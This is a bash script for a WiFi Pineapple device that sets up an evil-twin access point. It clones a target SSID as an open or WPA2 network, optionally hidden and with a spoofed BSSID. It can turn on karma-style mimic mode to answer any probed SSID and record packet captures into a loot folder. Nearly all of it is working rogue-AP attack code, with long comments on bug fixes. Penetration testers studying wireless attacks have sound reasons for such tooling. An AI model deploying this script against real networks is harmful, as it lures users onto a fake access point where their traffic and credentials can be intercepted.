#!/bin/bash
#
# EvilTwin.sh - Dynamic PineAP evil-twin / clone-AP launcher for the
#               WiFi Pineapple Pager. Uses ONLY official Hak5 commands
#               (WIFI_*, PINEAPPLE_*, PAYLOAD_*_CONFIG) - see
#               documentation.hak5.org/wifi-pineapple-pager
#
# Confirmed by direct testing against this device's local API:
#   WIFI_WPA_AP / WIFI_OPEN_AP / WIFI_MGMT_AP only accept the
#   pre-defined radio0 interfaces (wlan0wpa / wlan0open / wlan0mgmt).
#   There is no official way to run the clone AP on radio1 (5GHz).
#   Hak5's intended design: Ethernet/USB-C (eth1) carries the uplink,
#   radio0 stays fully dedicated to PineAP.
#
# Usage:
#   EvilTwin.sh                                   interactive mode
#   EvilTwin.sh --cloned "SSID" [--clone-pw PW] [options]
#
# Options:
#   --cloned SSID        SSID to clone / broadcast (required)
#   --clone-pw PASS      Password for the clone (WPA2-PSK). Omit for an open AP.
#   --hidden             Hide the clone AP's SSID
#   --bssid MAC           Specific BSSID for the clone AP (default: device MAC)
#   --uplink eth|wifi|auto   Uplink source (default: auto)
#   --wifi SSID           Uplink WiFi SSID (uplink=wifi only)
#   --wifi-pw PASS        Uplink WiFi password (uplink=wifi only)
#   --mimic               Enable PineAP mimic mode (answer ANY probed SSID, open AP only)
#   --record              Start an official WIFI_PCAP capture of the engagement
#   --scope-filter         Restrict the network filter to only the cloned SSID (default: on)
#   --no-scope-filter       Do not touch PineAP network filters
#   --stop, --off          Tear down the evil AP (and uplink WiFi client, if we started it)
#   --on                    Bring the AP back up using your last saved settings (no prompts)
#   --status               Show current PineAP / uplink status and exit
#   -y, --yes              Don't prompt for confirmation
#   -h, --help              This help
#
# Settings are persisted with the official PAYLOAD_SET_CONFIG store under the
# "eviltwin" namespace, so re-running interactively will offer your last values
# as defaults.

set -u
TOOL_NAME="EvilTwin.sh"
CFG_NS="eviltwin"
LOOT_DIR="/root/loot/pcap"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/lib/common.sh"

usage() { print_help "$0"; exit 1; }

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
CLONED_SSID=""
CLONE_PW=""
HIDDEN=0
BSSID=""
UPLINK_MODE="auto"
UPLINK_SSID=""
UPLINK_PW=""
MIMIC=0
RECORD=0
SCOPE_FILTER=1
ASSUME_YES=0
DO_STOP=0
DO_STATUS=0
DO_ON=0

while [ $# -gt 0 ]; do
    case "$1" in
        --cloned) [ $# -lt 2 ] && die "--cloned needs a value"; CLONED_SSID="$2"; shift 2 ;;
        --clone-pw) [ $# -lt 2 ] && die "--clone-pw needs a value"; CLONE_PW="$2"; shift 2 ;;
        --hidden) HIDDEN=1; shift ;;
        --bssid) [ $# -lt 2 ] && die "--bssid needs a value"; BSSID="$2"; shift 2 ;;
        --uplink) [ $# -lt 2 ] && die "--uplink needs a value"; UPLINK_MODE="$2"; shift 2 ;;
        --wifi) [ $# -lt 2 ] && die "--wifi needs a value"; UPLINK_SSID="$2"; shift 2 ;;
        --wifi-pw) [ $# -lt 2 ] && die "--wifi-pw needs a value"; UPLINK_PW="$2"; shift 2 ;;
        --mimic) MIMIC=1; shift ;;
        --record) RECORD=1; shift ;;
        --scope-filter) SCOPE_FILTER=1; shift ;;
        --no-scope-filter) SCOPE_FILTER=0; shift ;;
        --stop|--off) DO_STOP=1; shift ;;
        --on) DO_ON=1; shift ;;
        --status) DO_STATUS=1; shift ;;
        -y|--yes) ASSUME_YES=1; shift ;;
        -h|--help) usage ;;
        *) err "Unknown argument: $1"; usage ;;
    esac
done

# --on: restore last saved settings and skip straight to configuration (no prompts)
if [ "$DO_ON" = "1" ]; then
    CLONED_SSID=$(cfg_get last_cloned)
    [ -z "$CLONED_SSID" ] && die "No previously saved settings found. Run EvilTwin.sh once with --cloned (or interactively) first."
    CLONE_PW=$(cfg_get last_clone_pw)
    UPLINK_MODE=$(cfg_get last_uplink_mode); [ -z "$UPLINK_MODE" ] && UPLINK_MODE="auto"
    UPLINK_SSID=$(cfg_get last_uplink_ssid)
    UPLINK_PW=$(cfg_get last_uplink_pw)
    HIDDEN=$(cfg_get last_hidden); [ "$HIDDEN" != "1" ] && HIDDEN=0
    MIMIC=$(cfg_get last_mimic); [ "$MIMIC" != "1" ] && MIMIC=0
    RECORD=$(cfg_get last_record); [ "$RECORD" != "1" ] && RECORD=0
    BSSID=$(cfg_get last_bssid)
    SCOPE_FILTER=$(cfg_get last_scope_filter); [ -z "$SCOPE_FILTER" ] && SCOPE_FILTER=1
    ASSUME_YES=1
    say "Restoring last saved settings for '$CLONED_SSID'..."
fi

INTERACTIVE=0
if [ -z "$CLONED_SSID" ] && [ "$DO_STOP" = "0" ] && [ "$DO_STATUS" = "0" ] && [ "$DO_ON" = "0" ]; then
    INTERACTIVE=1
fi

# ---------------------------------------------------------------------------
# Status
# ---------------------------------------------------------------------------
show_status() {
    say "PineAP / uplink status:"
    echo
    echo "-- radio0 (2.4GHz) interfaces --"
    iw dev 2>/dev/null | awk '/phy#/{p=$0} /Interface/{print p" "$0}'
    echo
    echo "-- Ethernet uplink (eth1) --"
    if ip link show eth1 >/dev/null 2>&1; then
        ip -4 addr show eth1 2>/dev/null
    else
        echo "  eth1 not present (USB-C ethernet adapter not connected)"
    fi
    echo
    echo "-- WiFi client uplink (wlan0cli) --"
    ip -4 addr show wlan0cli 2>/dev/null || echo "  not configured"
}

if [ "$DO_STATUS" = "1" ]; then
    show_status
    exit 0
fi

# ---------------------------------------------------------------------------
# Stop / teardown
# ---------------------------------------------------------------------------
if [ "$DO_STOP" = "1" ]; then
    say "Disabling clone APs..."
    # BUG FOUND AND FIXED (same class found and fixed across reset.sh/
    # deauth.sh/bluetooth.sh this session): none of these platform calls
    # had a timeout - each talks to the WiFi AP/PineAP subsystem directly,
    # the same kind of thing that already hung once this session (the
    # ubus/network-reload incident). reset.sh's reset_processes now bounds
    # this whole script's --stop from the OUTSIDE too (see that file), but
    # that only helps callers that go through reset.sh - a direct/
    # standalone `EvilTwin.sh --stop` had (and without this, still would
    # have) no protection at all. Bounded each call individually so --stop
    # can never hang regardless of how it's invoked.
    #
    # LIVE-VERIFIED AND CORRECTED (found via live testing, not just code
    # review): an initial `timeout 10` here was measured live against the
    # real device and was too tight - PINEAPPLE_MIMIC_DISABLE was directly
    # timed at 15.1s on one call (returned rc=0 on its own; a retest right
    # after came back in 0.2-0.3s, so this looks like transient PineAP-
    # daemon contention, not a fixed one-time cost - meaning it can recur
    # unpredictably, not just right after a boot). `timeout 10` would have
    # KILLED that call mid-operation before it finished its own successful
    # cleanup - a real regression this fix would have introduced. Widened
    # to 20s (comfortable margin above the observed 15.1s) for every call
    # in this block, and reset.sh's own outer per-script timeout was
    # widened to match (see reset.sh's reset_processes).
    timeout 20 WIFI_WPA_AP_DISABLE wlan0wpa 2>/dev/null
    timeout 20 WIFI_OPEN_AP_DISABLE wlan0open 2>/dev/null
    timeout 20 PINEAPPLE_MIMIC_DISABLE 2>/dev/null
    timeout 20 WIFI_PCAP_STOP 2>/dev/null
    if [ "$(cfg_get started_wifi_uplink)" = "1" ]; then
        say "Disconnecting WiFi uplink we started..."
        timeout 20 WIFI_DISCONNECT wlan0cli 2>/dev/null
        cfg_set started_wifi_uplink 0
    fi
    # BUG FOUND AND FIXED (found via code review): --scope-filter (the
    # default) calls PINEAPPLE_NETWORK_FILTER_MODE allow + _ADD "$CLONED_SSID"
    # to restrict the whole PineAP network filter to just this engagement's
    # SSID - but --stop never undid it. The allow-list stayed scoped to a
    # single stale SSID after teardown, silently affecting every other
    # PineAP feature (mimic, SSID pool, etc.) until someone happened to run
    # filters.sh to notice. Remove the SSID we added, on the same condition
    # (last_scope_filter=1) that added it.
    if [ "$(cfg_get last_scope_filter)" = "1" ]; then
        last_ssid="$(cfg_get last_cloned)"
        if [ -n "$last_ssid" ]; then
            say "Removing '$last_ssid' from the PineAP network allow-list (added by --scope-filter)..."
            timeout 20 PINEAPPLE_NETWORK_FILTER_DELETE allow "$last_ssid" 2>/dev/null
        fi
        # BUG FOUND AND FIXED: removing the SSID above can leave the
        # allow-list empty while the filter MODE is still "allow" - under
        # standard allow/deny-list semantics an empty allow-list means
        # "allow nothing", which would keep breaking every other PineAP
        # feature (mimic, SSID pool, etc.) exactly as the comment above
        # describes, just for a different reason than the original bug.
        # Switching mode to "deny" is the unambiguous neutral/unrestricted
        # state (an empty deny-list denies nothing) regardless of exactly
        # how the allow-list behaves when empty - a safe default to leave
        # the filter in after tearing down a scoped engagement.
        timeout 20 PINEAPPLE_NETWORK_FILTER_MODE deny 2>/dev/null
    fi
    say "Done. (APs are disabled, not deleted - rerun to reconfigure)"
    exit 0
fi

# ---------------------------------------------------------------------------
# Interactive prompts
# ---------------------------------------------------------------------------
if [ "$INTERACTIVE" = "1" ]; then
    echo "== EvilTwin.sh interactive setup =="
    CLONED_SSID=$(ask "SSID to clone/broadcast" "$(cfg_get last_cloned)")
    [ -z "$CLONED_SSID" ] && die "A cloned SSID is required."

    if confirm "Password-protect the clone (WPA2), matching a real network's password?"; then
        read -r -s -p "Clone password: " CLONE_PW; echo
    fi

    if confirm "Hide the clone SSID from normal scans?"; then HIDDEN=1; fi

    UPLINK_MODE=$(ask "Uplink mode (auto/eth/wifi)" "${UPLINK_MODE}")

    if [ "$UPLINK_MODE" = "wifi" ]; then
        UPLINK_SSID=$(ask "Uplink WiFi SSID (for internet)" "$(cfg_get last_uplink_ssid)")
        read -r -s -p "Uplink WiFi password (blank = open network): " UPLINK_PW; echo
    fi

    if confirm "Enable PineAP mimic mode (answer ANY probed SSID - open AP only)?"; then MIMIC=1; fi
    if confirm "Record an official WIFI_PCAP capture of this session?"; then RECORD=1; fi
    if confirm "Scope the PineAP network filter to only this cloned SSID? (recommended)"; then
        SCOPE_FILTER=1
    else
        SCOPE_FILTER=0
    fi
fi

[ -z "$CLONED_SSID" ] && die "No SSID given. Use --cloned or run interactively."
# BUG FOUND AND FIXED (found via code review): --bssid was never format-
# checked before being handed to WIFI_WPA_AP/WIFI_OPEN_AP - a typo'd value
# would only surface as a generic "WIFI_WPA_AP failed" after setup_uplink
# already ran (up to 30s of WiFi-uplink connect/wait, or the eth1 poll
# loop). Same is_valid_mac() check clientip.sh/deauth.sh already use for
# exactly this, run up front so a bad BSSID fails fast with a clear reason
# instead of a generic failure after the slow uplink setup work.
[ -n "$BSSID" ] && { is_valid_mac "$BSSID" || die "'$BSSID' doesn't look like a MAC address (expected aa:bb:cc:dd:ee:ff) - check for a typo."; }

# BUG FOUND AND FIXED (found via code review): this whole cfg_set block
# used to run unconditionally right here, BEFORE setup_uplink/the actual
# WIFI_WPA_AP/WIFI_OPEN_AP call ever ran - the same "persists a value even
# when the command failed" bug class already found and fixed for last_ssid
# in mgmt.sh and openap.sh. setup_uplink can die() outright (e.g. eth1 not
# present, WIFI_CONNECT failing for a wifi uplink) and WIFI_WPA_AP/
# WIFI_OPEN_AP below can also fail - either way this used to already have
# saved "last_cloned"/"last_clone_pw" as if the engagement had actually
# come up, so the next interactive run would offer a clone SSID/password
# that was never actually broadcast. Moved below, after the AP is
# confirmed actually up.
# ---------------------------------------------------------------------------
# Uplink: auto-detect Ethernet vs WiFi client
# ---------------------------------------------------------------------------
setup_uplink() {
    local mode="$UPLINK_MODE"

    if [ "$mode" = "auto" ]; then
        if ip link show eth1 >/dev/null 2>&1; then
            mode="eth"
        else
            mode="wifi"
        fi
    fi
    # BIG CHANGE (see the health check right after the AP comes up, below):
    # exposed as a global so the caller can tell, after the fact, whether
    # this run actually used the risky same-radio combo the "wifi" branch
    # below only ever WARNS about - "mode" was previously local and thrown
    # away the moment this function returned.
    RESOLVED_UPLINK_MODE="$mode"

    case "$mode" in
        eth)
            if ! ip link show eth1 >/dev/null 2>&1; then
                die "Ethernet uplink requested but eth1 is not present. Plug in the USB-C ethernet adapter, or use --uplink wifi."
            fi
            say "Using Ethernet uplink (eth1) - radio0 is fully free for PineAP. This is the officially recommended, stable configuration."
            local tries=0
            while [ $tries -lt 10 ]; do
                ip -4 addr show eth1 2>/dev/null | grep -q "inet " && break
                sleep 1; tries=$((tries+1))
            done
            if ! ip -4 addr show eth1 2>/dev/null | grep -q "inet "; then
                err "eth1 has no IPv4 address yet. Check the cable/router on the other end. Continuing anyway."
            fi
            ;;
        wifi)
            [ -z "$UPLINK_SSID" ] && die "Uplink mode is 'wifi' but no --wifi SSID was given."
            say "WARNING: WiFi-client uplink shares radio0 with the clone AP."
            say "This hardware has shown driver instability (a firmware 'out of range'"
            say "bug) when combining client mode and PineAP AP mode on the SAME radio."
            say "If the AP fails to come up after this, a reboot is usually required."
            say "Ethernet uplink (--uplink eth) avoids this entirely and is recommended."
            if [ "$ASSUME_YES" != "1" ]; then
                confirm "Continue with WiFi-client uplink anyway?" || die "Aborted. Use Ethernet uplink instead."
            fi
            say "Connecting to uplink network '$UPLINK_SSID'..."
            if [ -n "$UPLINK_PW" ]; then
                WIFI_CONNECT wlan0cli "$UPLINK_SSID" psk2 "$UPLINK_PW" ANY || die "WIFI_CONNECT failed"
            else
                # "open" + "NONE" confirmed via WIFI_CONNECT --help on-device.
                WIFI_CONNECT wlan0cli "$UPLINK_SSID" open NONE ANY || die "WIFI_CONNECT failed"
            fi
            say "Waiting for uplink association (up to 30s)..."
            if WIFI_WAIT wlan0cli 30; then
                say "Uplink connected."
                cfg_set started_wifi_uplink 1
            else
                err "Uplink did not connect within 30s. Continuing - check with --status."
            fi
            ;;
        *)
            die "Unknown --uplink mode '$mode' (expected eth, wifi, or auto)"
            ;;
    esac
}

setup_uplink

# ---------------------------------------------------------------------------
# Configure the clone AP (official WIFI_WPA_AP / WIFI_OPEN_AP)
# ---------------------------------------------------------------------------
say "Configuring clone access point..."

if [ -n "$CLONE_PW" ]; then
    say "Cloning '$CLONED_SSID' as a WPA2 access point (Pineapple Evil WPA)."
    if [ -n "$BSSID" ]; then
        WIFI_WPA_AP wlan0wpa "$CLONED_SSID" psk2 "$CLONE_PW" "$BSSID" || die "WIFI_WPA_AP failed"
    else
        WIFI_WPA_AP wlan0wpa "$CLONED_SSID" psk2 "$CLONE_PW" || die "WIFI_WPA_AP failed"
    fi
    [ "$HIDDEN" = "1" ] && WIFI_WPA_AP_HIDE wlan0wpa
    AP_IFACE="wlan0wpa"
else
    say "Broadcasting '$CLONED_SSID' as an open access point (Pineapple Open AP)."
    if [ -n "$BSSID" ]; then
        WIFI_OPEN_AP wlan0open "$CLONED_SSID" "$BSSID" || die "WIFI_OPEN_AP failed"
    else
        WIFI_OPEN_AP wlan0open "$CLONED_SSID" || die "WIFI_OPEN_AP failed"
    fi
    [ "$HIDDEN" = "1" ] && WIFI_OPEN_AP_HIDE wlan0open
    AP_IFACE="wlan0open"

    if [ "$MIMIC" = "1" ]; then
        say "Enabling PineAP mimic mode (karma - answers any probed SSID)."
        PINEAPPLE_MIMIC_ENABLE
    fi
fi

# BIG CHANGE: setup_uplink()'s own "wifi" branch already WARNS up front that
# combining a WiFi-client uplink with PineAP AP mode on the SAME radio0 has
# shown real firmware instability on this hardware (an "out of range" bug
# that usually needs a reboot to clear) - but until now that warning was the
# only defense; nothing ever checked whether it actually happened. Confirmed-
# up per WIFI_WPA_AP/WIFI_OPEN_AP not dying doesn't mean the interface is
# genuinely healthy afterward if the two radio roles collided - so when that
# risky combination was actually used this run, check the AP interface's
# real operstate now and say so immediately and specifically if it looks
# wedged, instead of leaving the first sign of trouble to be "a client can't
# connect, and it turns out a reboot was needed."
if [ "$RESOLVED_UPLINK_MODE" = "wifi" ]; then
    _opstate=$(cat "/sys/class/net/$AP_IFACE/operstate" 2>/dev/null)
    case "$_opstate" in
        up|unknown) : ;;
        *) err "The clone AP interface ($AP_IFACE) doesn't look healthy right after coming up alongside the WiFi uplink on radio0 (operstate: '${_opstate:-unknown/missing}') - this matches the known same-radio driver instability this script warns about. A reboot (reset.sh --reboot) is likely needed before retrying; Ethernet uplink (--uplink eth) avoids this combination entirely." ;;
    esac
fi

# The AP is confirmed up at this point (both WIFI_WPA_AP/WIFI_OPEN_AP
# branches above `die` on failure) - now safe to persist as "last known
# good" settings for --on / the next interactive run's defaults.
cfg_set last_cloned "$CLONED_SSID"
cfg_set last_clone_pw "$CLONE_PW"
cfg_set last_uplink_mode "$UPLINK_MODE"
cfg_set last_hidden "$HIDDEN"
cfg_set last_mimic "$MIMIC"
cfg_set last_record "$RECORD"
cfg_set last_bssid "$BSSID"
cfg_set last_scope_filter "$SCOPE_FILTER"
[ -n "$UPLINK_SSID" ] && cfg_set last_uplink_ssid "$UPLINK_SSID"
[ -n "$UPLINK_PW" ] && cfg_set last_uplink_pw "$UPLINK_PW"

if [ "$SCOPE_FILTER" = "1" ]; then
    say "Scoping PineAP network filter to '$CLONED_SSID' only (allow mode)."
    PINEAPPLE_NETWORK_FILTER_MODE allow
    PINEAPPLE_NETWORK_FILTER_ADD "$CLONED_SSID"
fi

if [ "$RECORD" = "1" ]; then
    say "Starting official WIFI_PCAP capture..."
    PCAP_FILE=$(WIFI_PCAP_START)
    say "Capture running: ${PCAP_FILE:-see $LOOT_DIR}"
fi

echo
say "Done. Summary:"
echo "  Clone SSID:   $CLONED_SSID $( [ -n "$CLONE_PW" ] && echo '(WPA2)' || echo '(open)' )"
echo "  AP interface: $AP_IFACE (radio0, 2.4GHz)"
echo "  Hidden:       $( [ "$HIDDEN" = "1" ] && echo yes || echo no )"
echo "  Uplink:       $UPLINK_MODE"
echo "  Recording:    $( [ "$RECORD" = "1" ] && echo yes || echo no )"
echo
echo "Run 'EvilTwin.sh --status' to check state, or 'EvilTwin.sh --stop' to tear down."
